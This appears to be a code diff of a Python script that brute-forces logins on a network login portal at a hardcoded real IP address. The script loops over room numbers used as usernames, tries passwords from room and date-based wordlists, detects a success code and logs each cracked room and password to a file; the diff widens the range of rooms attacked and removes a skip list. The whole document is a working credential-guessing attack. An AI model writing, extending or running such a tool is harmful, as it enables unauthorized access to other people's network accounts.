@@ -1,5 +1,6 @@
 import requests
 
+# http request fun
 def postform(room, passwd):
     url = 'http://218.195.105.242'
     form = {'0MKKey': '123456', 'DDDDD': room, 'R1': '0', 'R2': '1', 'para': '00', 'upass': passwd}
@@ -22,45 +23,45 @@ def postform(room, passwd):
 
 
 if __name__ == "__main__":
-    todo = 0
-    for i in range(7,9):
-        print(i)
+
+    success = open("./success.rom", "a") # success log file
+    todo = 0 # conut
+
+    # start
+    for i in range(1,9):
         for j in range(1,6):
-            print(j)
             for k in range(1,9):
-                print(k)
                 room = str(i) + str(j) + '0' + str(k)
-                if room == '2103' or room == '2306' or room == '6201' or room == '6203' or room == '1301' or room == '3103':
-                    todo+=1
-                    continue
-                #datepass = open("./datepass", "r")
-                datepass1 = open("./datepass1", "r")
-                roompass = open("./roompass1", "r")
+                print(room)
+                # jump some room
+                #if room == '2103' or room == '2306' or room == '6201' or room == '6203' or room == '1301' or room == '3103':
+                #    todo+=1
+                #    continue
                 
-                passwd = roompass.readlines()[todo]
+                datepass = open("./datepass", "r") # data passwd file
+                roompass = open("./roompass", "r") # room passwd file
+                passwd = roompass.readlines()[todo] # get room passwd
                 todo+=1
-                #print(passwd)
-                rea = postform(room, passwd)
+                rea = postform(room, passwd) # try by room passwd
+                # try success
                 if rea == '3547':
-                    print room
-                    print("room")
+                    print("room: " + room)
+                    success.write(room + "\nroom\n") # write
                     continue
 
                 while True:
-                    line=datepass1.readline()
+                    line=datepass.readline() # get date passwd
                     if line:
-                        re = postform(room, line)
+                        re = postform(room, line) # try by date passwd
+                        # try success
                         if re == '3547':
-                            print(room)
-                            print(line)
-                            success = open("./success1", "a")
-                            success.write(room + "\n" + line + "\n")
-                            success.close()
+                            print("room: " + room)
+                            print("pass: " + line)
+                            success.write(room + "\n" + line + "\n") # write
                             break
                     else:
                         break
-
-                #datepass.close()
-                datepass1.close()
+                # close files
+                datepass.close()
                 roompass.close()
-
+    success.close()
